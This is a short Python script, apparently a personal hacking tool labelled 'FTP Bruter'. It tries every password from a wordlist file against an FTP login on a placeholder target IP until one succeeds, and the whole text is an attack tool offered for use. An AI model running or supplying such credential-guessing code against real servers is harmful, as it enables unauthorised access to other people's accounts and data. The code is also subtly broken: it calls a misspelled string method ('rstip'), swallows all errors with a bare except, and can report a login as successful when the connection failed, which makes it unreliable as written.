#imports
import ftplib, pyfiglet

banner = pyfiglet.figlet_format("FTP  Bruter")
print(banner, end="")
print("|"+"_"*19 + "@oyeanmol" + "_"*19+"|")
print("\n")


def check(user, password):
    try:
        print(f"\nTrying {user}:{password}...")
        ftp = ftplib.FTP()
        if ftp.connect("Target_IP_Address", 21): #put your Target IP Address here
            ftp.login(user, password)
            print(f"Successfully logged in as: {user}:{password}")
        ftp.quit()
        return True
    except:
        return False

user = input("Enter the username: ")
passlist = open('pass.txt', 'r') #modify according to your wordlist
for password in passlist:
    if check(user, password.rstip()) == True:
        break
    